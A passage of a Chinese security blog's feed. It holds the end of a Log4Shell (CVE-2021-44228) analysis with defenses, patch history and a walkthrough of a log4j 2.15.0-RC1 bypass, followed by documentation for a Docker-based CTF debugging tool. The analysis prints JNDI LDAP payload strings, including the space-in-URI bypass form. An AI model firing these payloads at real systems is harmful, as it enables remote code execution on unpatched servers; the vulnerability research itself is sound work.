class="name">Configuration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Appenders</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Console</span> <span class="attr">name</span>=<span class="string">&quot;Console&quot;</span> <span class="attr">target</span>=<span class="string">&quot;SYSTEM_OUT&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">PatternLayout</span> <span class="attr">pattern</span>=<span class="string">&quot;[%t] %-5level %m&#123;nolookups&#125; %n&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Console</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Appenders</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Loggers</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Root</span> <span class="attr">level</span>=<span class="string">&quot;info&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">AppenderRef</span> <span class="attr">ref</span>=<span class="string">&quot;Console&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Loggers</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="拓展思考-log4j2为什么需要JNDI功能"><a href="#拓展思考-log4j2为什么需要JNDI功能" class="headerlink" title="拓展思考 - log4j2为什么需要JNDI功能"></a>拓展思考 - log4j2为什么需要JNDI功能</h3><p>在<a href="https://logging.apache.org/log4j/log4j-2.3/manual/configuration.html#PropertySubstitution">Log4j – Configuring Log4j 2 - Apache Log4j 2</a>找到Property Substitution（属性替换）功能，以通过本地之外的来源获取属性，使日志信息更加丰富</p><p>由于开发者没有考虑到JNDI的潜在危害，因此没有将其默认配置值设置为不加载也没有对JNDI来源地址进行限制</p><h2 id="其它拓展"><a href="#其它拓展" class="headerlink" title="其它拓展"></a>其它拓展</h2><h3 id="常见的假阳性结果"><a href="#常见的假阳性结果" class="headerlink" title="常见的假阳性结果"></a>常见的假阳性结果</h3><p>许多测试者通过DNS信息来判断是否发生了解析，以此来确定漏洞是否触发，这是不严谨的，许多公共服务都可能对这个地址进行DNS查询，用于垃圾拦截等功能，这不能代表其成功触发了漏洞</p><p>比较好的方式是在子域名中添加一个内嵌查询，如<code>$&#123;sys:java.version&#125;</code></p><h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><ol><li>升级log4j core的最新版本</li><li>在配置文件中的Layout设置禁止LookUp</li><li>在系统配置中将设置<code>formatMsgNoLookups</code>为true，禁止LookUp</li></ol><h3 id="官方的修复方法"><a href="#官方的修复方法" class="headerlink" title="官方的修复方法"></a>官方的修复方法</h3><blockquote><p>参考：<a href="https://logging.apache.org/log4j/2.x/changes-report.html">https://logging.apache.org/log4j/2.x/changes-report.html</a></p></blockquote><p>在2.15.0已默认禁用Message里的Lookups，并且默认限制了JNDI以及LDAP可以获取的类</p><p><img src="../../img/CVE-2021-44228%20log4j2%20RCE%20%E5%88%86%E6%9E%90/image-20220117152244412.png" alt="image-20220117152244412"></p><p><img src="../../img/CVE-2021-44228%20log4j2%20RCE%20%E5%88%86%E6%9E%90/image-20220117152320407.png" alt="image-20220117152320407"></p><p>除此之外，在2.16.0，默认禁用JNDI，需要使用<code>log4j.enableJndi</code>来启用</p><p>彻底移除在Message中的LookUps支持</p><p><img src="../../img/CVE-2021-44228%20log4j2%20RCE%20%E5%88%86%E6%9E%90/image-20220116194734802.png" alt="image-20220116194734802"></p><h2 id="log4j-2-15-0-RC1绕过"><a href="#log4j-2-15-0-RC1绕过" class="headerlink" title="log4j 2.15.0-RC1绕过"></a>log4j 2.15.0-RC1绕过</h2><p>Google了解到2.15.0-RC1这个候选发行版仍然存在可以被Bypass的可能性</p><h3 id="编译log4j-2-15-0-RC1"><a href="#编译log4j-2-15-0-RC1" class="headerlink" title="编译log4j 2.15.0-RC1"></a>编译log4j 2.15.0-RC1</h3><blockquote><p>由于RC版本现在在Maven仓库已经没有了，所有只能去GitHub手动获取源代码进行编译</p><p><a href="https://github.com/apache/logging-log4j2/tags">Tags · apache/logging-log4j2 (github.com)</a></p></blockquote><p>下载源代码后，根据README，先配置toolschains，调整jdk位置，由于只需要jdk1.8的包，只使用1.8的toolchain，其它注释掉</p><p>由于不需要编译所有包，在<code>pom.xml</code>中找到<code>modules</code></p><p>将不需要的包注释，仅保留<code>log4j-core</code>和<code>log4j-api</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">modules</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- &lt;module&gt;log4j-api-java9&lt;/module&gt; --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">module</span>&gt;</span>log4j-api<span class="tag">&lt;/<span class="name">module</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- &lt;module&gt;log4j-core-java9&lt;/module&gt; --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">module</span>&gt;</span>log4j-core<span class="tag">&lt;/<span class="name">module</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- &lt;module&gt;log4j-layout-template-json&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-core-its&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-1.2-api&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-slf4j-impl&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-slf4j18-impl&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-to-slf4j&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-jcl&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-flume-ng&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-taglib&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-jmx-gui&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-samples&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-bom&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-jdbc-dbcp2&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-jpa&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-couchdb&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-mongodb3&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-mongodb4&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-cassandra&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-web&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-jakarta-web&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-perf&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-iostreams&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-jul&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-jpl&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-liquibase&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-appserver&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-osgi&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-docker&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-kubernetes&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-spring-boot&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-spring-cloud-config&lt;/module&gt; --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">modules</span>&gt;</span></span><br></pre></td></tr></table></figure><p>使用如下mvn指令编译</p><ul><li><p><code>-t toolchains-sample-mac.xml</code> 指定toolchains文件</p></li><li><p><code>-Dmaven.test.skip=true</code> 跳过测试</p></li><li><p><code>-Dhttp.proxyHost=127.0.0.1 -Dhttp.proxyPort=1099</code> 使用代理加速</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># JAVA_HOME设置为jdk1.8</span></span><br><span class="line">./mvnw clean install -t toolchains-sample-mac.xml -Dmaven.test.skip=<span class="literal">true</span> -Dhttp.proxyHost=127.0.0.1 -Dhttp.proxyPort=1099</span><br></pre></td></tr></table></figure><p>编译完成后生成的artifact(jar包)在各个module的target文件夹中</p><h3 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h3><p>在pom.xml修改log4j-core版本为2.15.0，然后将编译出来的jar包全部替换进去</p><p>由于2.15.0版本中默认禁用了LookUp，我们首先需要通过配置将其打开</p><p>修改<code>log4j2.xml</code>配置</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Configuration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Appenders</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Console</span> <span class="attr">name</span>=<span class="string">&quot;Console&quot;</span> <span class="attr">target</span>=<span class="string">&quot;SYSTEM_OUT&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">PatternLayout</span> <span class="attr">pattern</span>=<span class="string">&quot;[%t] %-5level %m&#123;lookups&#125; %n&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Console</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Appenders</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Loggers</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Root</span> <span class="attr">level</span>=<span class="string">&quot;info&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">AppenderRef</span> <span class="attr">ref</span>=<span class="string">&quot;Console&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Loggers</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><p>此时，Payload如下可以被解析</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;sys:java.version&#125;</span><br></pre></td></tr></table></figure><p>但是JNDI Payload不会被解析</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap://ip:1389/#Exploit&#125;</span><br></pre></td></tr></table></figure><p>由于我们知道现在<code>$&#123;&#125;</code>还是会解析，但是jndi受限制，所以根据之前的分析，我们前往<code>StrSubstitutor.resolveVariable()</code>看看变量解析的工作流程</p><p><img src="../../img/CVE-2021-44228%20log4j2%20RCE%20%E5%88%86%E6%9E%90/image-20220117231047455.png" alt="image-20220117231047455"></p><p>进入<code>lookup()</code></p><p><img src="../../img/CVE-2021-44228%20log4j2%20RCE%20%E5%88%86%E6%9E%90/image-20220117231511877.png" alt="image-20220117231511877"></p><p>我们可以发现JNDI其实还是可以解析的，再进入一层<code>lookup</code>，观察JNDI内部受到了什么限制</p><p><img src="../../img/CVE-2021-44228%20log4j2%20RCE%20%E5%88%86%E6%9E%90/image-20220117231809554.png" alt="image-20220117231809554"></p><p>继续进入jndiManager的lookup</p><p>可以发现，首先使用了一些协议和来源地址的限制</p><p><img src="../../img/CVE-2021-44228%20log4j2%20RCE%20%E5%88%86%E6%9E%90/image-20220117232148838.png" alt="image-20220117232148838"></p><p><img src="../../img/CVE-2021-44228%20log4j2%20RCE%20%E5%88%86%E6%9E%90/image-20220117232027812.png" alt="image-20220117232027812"></p><p>来源地址可以发现是本机的一些IP，此时假设来源地址的限制也不影响我们，我们也是在本地做测试，并且ldap也在允许的协议中</p><p><img src="../../img/CVE-2021-44228%20log4j2%20RCE%20%E5%88%86%E6%9E%90/image-20220117232751415.png" alt="image-20220117232751415"></p><p>可以发现此处禁止了引用对象的使用，检查方法是<code>attributeMap.get(OBJECT_FACTORY)!=null</code></p><p>除此之外，还限制了JNDI的另一种利用方式——反序列化，其通过<code>allowedClasses</code>将可以反序列化的类型限制在了Java的几个基本类型</p><p><img src="../../img/CVE-2021-44228%20log4j2%20RCE%20%E5%88%86%E6%9E%90/image-20220117234337261.png" alt="image-20220117234337261"></p><p>虽然局部看起来很完美，但是代码的异常捕捉逻辑有问题，可以看到如下</p><p><img src="../../img/CVE-2021-44228%20log4j2%20RCE%20%E5%88%86%E6%9E%90/image-20220117232926045.png" alt="image-20220117232926045"></p><p>如果出现URI语法错误，就可以直接触发异常处理并进入lookup，那要如何让URI出错又能正常lookup呢？</p><p>只需往URI中加一个无URL编码的空格即可，lookup的时候会忽略这个空格，我们把payload改为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap://127.0.0.1:1389/# Exploit&#125;</span><br></pre></td></tr></table></figure><p>可以发现成功触发命令执行</p><p><img src="../../img/CVE-2021-44228%20log4j2%20RCE%20%E5%88%86%E6%9E%90/image-20220117233150910.png" alt="image-20220117233150910"></p><h3 id="绕过总结"><a href="#绕过总结" class="headerlink" title="绕过总结"></a>绕过总结</h3><p>此处绕过的条件较为苛刻，必须满足如下两个条件</p><ul><li>开发者主动开启lookups功能</li><li>LDAP来源地址必须在白名单中，而默认白名单为本机地址</li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://www.youtube.com/watch?v=w2F67LbEtnk&feature=youtu.be">Log4j Vulnerability (Log4Shell) Explained // CVE-2021-44228 - YouTube</a></li><li><a href="https://logging.apache.org/log4j/2.x/changes-report.html">https://logging.apache.org/log4j/2.x/changes-report.html</a></li><li><a href="https://paper.seebug.org/1786/">log4j2 漏洞分析与思考 (seebug.org)</a></li><li><a href="https://www.anquanke.com/post/id/262668">Apache Log4j2 远程代码执行漏洞分析 - 安全客，安全资讯平台 (anquanke.com)</a></li><li><a href="https://logging.apache.org/log4j/2.x/manual/configuration.html">Log4j – Configuring Log4j 2 (apache.org)</a></li><li><a href="https://xz.aliyun.com/t/10649#toc-2">Apache Log4j2从RCE到RC1绕过 - 先知社区 (aliyun.com)</a></li><li><a href="https://www.anquanke.com/post/id/201181">JNDI with LDAP - 安全客，安全资讯平台 (anquanke.com)</a></li><li><a href="https://docs.oracle.com/javase/jndi/tutorial/objects/storing/serial.html">Serializable Objects (oracle.com)</a></li><li><a href="https://docs.oracle.com/javase/jndi/tutorial/objects/storing/reference.html">Referenceable Objects and References (oracle.com)</a></li><li><a href="https://www.icode9.com/content-4-1253127.html">跟风蹭热度编译个logging-log4j2包-jdk11 (icode9.com)</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;使用Java 8u181&lt;/p&gt;</summary>
    
    
    
    <category term="漏洞分析" scheme="https://cn.4xpl0r3r.com/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="JNDI" scheme="https://cn.4xpl0r3r.com/tags/JNDI/"/>
    
    <category term="Java Web" scheme="https://cn.4xpl0r3r.com/tags/Java-Web/"/>
    
    <category term="CVE" scheme="https://cn.4xpl0r3r.com/tags/CVE/"/>
    
    <category term="格式化字符串" scheme="https://cn.4xpl0r3r.com/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
    
  </entry>
  
  <entry>
    <title>DIPD 文档</title>
    <link href="https://cn.4xpl0r3r.com/%E6%96%87%E6%A1%A3/DIPD-%E6%96%87%E6%A1%A3/"/>
    <id>https://cn.4xpl0r3r.com/%E6%96%87%E6%A1%A3/DIPD-%E6%96%87%E6%A1%A3/</id>
    <published>2021-08-25T21:18:54.000Z</published>
    <updated>2022-02-11T11:41:06.963Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/4xpl0r3r/DIPD">4xpl0r3r/DIPD: Debug with IDA and Pwntools in Docker (DIPD) (github.com)</a></p><span id="more"></span><article class="message message-immersive is-primary"><div class="message-body"><i class="fas fa-globe-americas mr-2"></i>本文同时提供以下语言的翻译：<a href="https://4xpl0r3r.com/Docs/DIPD-Document/">English</a>.</div></article><h2 id="关于"><a href="#关于" class="headerlink" title="关于"></a>关于</h2><p>通过这个工具，可以同时使用pwntools和IDA在docker中调试程序</p><p>安全 快速 强大(IDA)</p><h2 id="快速开始"><a href="#快速开始" class="headerlink" title="快速开始"></a>快速开始</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/4xpl0r3r/DIPD.git</span><br></pre></td></tr></table></figure><ol><li>安装Docker、docker-compose和IDA(你可以将他们安装在不同的主机上，只需要保证网络畅通即可)</li><li>将程序文件移动到<code>debug/</code> 目录并改名为<code>todebug</code></li><li>在此项目根目录运行<code>docker-compose up</code>命令</li></ol><p>完成上述步骤后，通过如下命令访问程序的标准输入输出</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc docker.ip 23458</span><br></pre></td></tr></table></figure><p>IDA Pro调试器参数 (版本7.6)</p><ul><li>Type: Remote Linux Debugger (Attach)</li><li>Hostname: docker.ip (运行docker主机的IP)</li><li>Port: 23946</li><li>不需要密码</li></ul><p>注意</p><ul><li>在使用IDA Attach到调试进程之前，必须先使用netcat或pwntools运行程序，否则无法在IDA中看到想要的进程</li><li>你必须在64位架构中运行的Docker以同时支持32位(i386)和64位(amd64)架构程序的调试</li></ul><h3 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h3><p>启动DIPD</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up</span><br></pre></td></tr></table></figure><p><img src="../../img/DIPD-%E6%96%87%E6%A1%A3/image-20210826061414997.png" alt="image-20210826061414997"></p><p>运行并连接到你所调试程序的STDIO</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc docker.ip 23458</span><br></pre></td></tr></table></figure><p>现在，你的二进制文件应该已经在运行了</p><p>接下来打开IDA并启动IDA调试器</p><p><img src="../../img/DIPD-%E6%96%87%E6%A1%A3/image-20210826061500161.png" alt="image-20210826061500161"></p><p>输入信息并点击OK</p><p><img src="../../img/DIPD-%E6%96%87%E6%A1%A3/image-20210826061510709.png" alt="image-20210826061510709"></p><p>现在你可以看到你的docker中的进程，选择<code>./todebug</code>调试并点击”OK”</p><p><img src="../../img/DIPD-%E6%96%87%E6%A1%A3/image-20210826061558556.png" alt="image-20210826061558556"></p><p>现在你应该已经进入调试视图，没有任何错误和异常</p><h2 id="文件-docker-compose-yml"><a href="#文件-docker-compose-yml" class="headerlink" title="文件 - docker-compose.yml"></a>文件 - docker-compose.yml</h2><h3 id="image"><a href="#image" class="headerlink" title="image"></a>image</h3><p>你可以在这里选择你想要的基本映像，这里有一些常用的选项</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">i386/ubuntu:16.04</span><br><span class="line">i386/ubuntu:18.04</span><br><span class="line">amd64/ubuntu:16.04</span><br><span class="line">amd64/ubuntu:18.04</span><br></pre></td></tr></table></figure><p>你必须在64位架构中运行的Docker以同时支持32位(i386)和64位(amd64)架构程序的调试，否则只能调试32位(i386)程序</p><h3 id="其他参数"><a href="#其他参数" class="headerlink" title="其他参数"></a>其他参数</h3><p>查看相关注释即可</p><h2 id="目录-files"><a href="#目录-files" class="headerlink" title="目录 - files"></a>目录 - files</h2><h3 id="目录-debs"><a href="#目录-debs" class="headerlink" title="目录 - debs"></a>目录 - <code>debs</code></h3><p>socat的apt包，用于快速安装和离线支持</p><h3 id="文件-linux-server-64"><a href="#文件-linux-server-64" class="headerlink" title="文件 - linux_server[64]"></a>文件 - <code>linux_server[64]</code></h3><p>IDA Debug Server v7.6</p><p>如果不想使用 IDA v7.6 版本，可以进行替换</p><h3 id="文件-init-sh"><a href="#文件-init-sh" class="headerlink" title="文件 - init.sh"></a>文件 - <code>init.sh</code></h3><p>此脚本文件用于初始化调试环境，你可以对其修改以进行任何调整</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://github.com/4xpl0r3r/DIPD&quot;&gt;4xpl0r3r/DIPD: Debug with IDA and Pwntools in Docker (DIPD) (github.com)&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="文档" scheme="https://cn.4xpl0r3r.com/categories/%E6%96%87%E6%A1%A3/"/>
    
    
    <category term="PWN" scheme="https://cn.4xpl0r3r.com/tags/PWN/"/>
    
    <category term="CTF" scheme="https://cn.4xpl0r3r.com/tags/CTF/"/>
    
    <category term="环境" scheme="https://cn.4xpl0r3r.com/tags/%E7%8E%AF%E5%A2%83/"/>
    
  </entry>
  
</feed>
